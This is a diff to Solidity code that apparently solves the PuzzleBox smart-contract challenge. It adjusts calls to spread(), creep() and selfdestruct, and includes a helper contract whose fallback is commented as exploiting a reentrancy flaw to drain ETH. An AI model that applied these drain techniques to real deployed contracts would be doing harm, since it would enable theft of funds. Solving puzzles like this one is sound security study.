@@ -30,18 +30,17 @@ contract PuzzleBoxSolution {
         ));
         require(r);
 
-        // (bool s,) = proxy.call(abi.encode(puzzle.zip.selector)); // doesn't revert everything
         puzzle.zip();
 
-        // puzzle.creep();
+        address payable[] memory friends = new address payable[](2);
+        uint256[] memory friendsCutBps = new uint256[](friends.length);
+        friends[0] = payable(0x416e59DaCfDb5D457304115bBFb9089531D873B7);
+        friends[1] = payable(0xC817dD2a5daA8f790677e399170c92AabD044b57);
+        friendsCutBps[0] = 0.015e4;
+        friendsCutBps[1] = 0.0075e4;
+        puzzle.spread(friends, friendsCutBps);
 
-        // address payable[] memory friends = new address payable[](2);
-        // uint256[] memory friendsCutBps = new uint256[](friends.length);
-        // friends[0] = payable(0x416e59DaCfDb5D457304115bBFb9089531D873B7);
-        // friends[1] = payable(0xC817dD2a5daA8f790677e399170c92AabD044b57);
-        // friendsCutBps[0] = 0.015e4;
-        // friendsCutBps[1] = 0.0075e4;
-        // puzzle.spread(friends, friendsCutBps);
+        puzzle.creep{ gas: 100_000 }();
     }
 }
 
@@ -71,7 +70,11 @@ contract EoaSpoof {
     function destro(address puzl, address solution) external {
         puzzle.leak();
         payable(address(uint160(puzl) + uint160(2))).call{ value: 1 }('');
-        selfdestruct(payable(solution));
+        // selfdestruct(payable(solution));
+
+        uint256 amt = address(this).balance - 7;
+        payable(solution).call{ value: amt }('');
+        selfdestruct(payable(puzl));
     }
 
     // fallback accepts drained ETH and exploits reentrancy vulnerability in puzzle's drip()
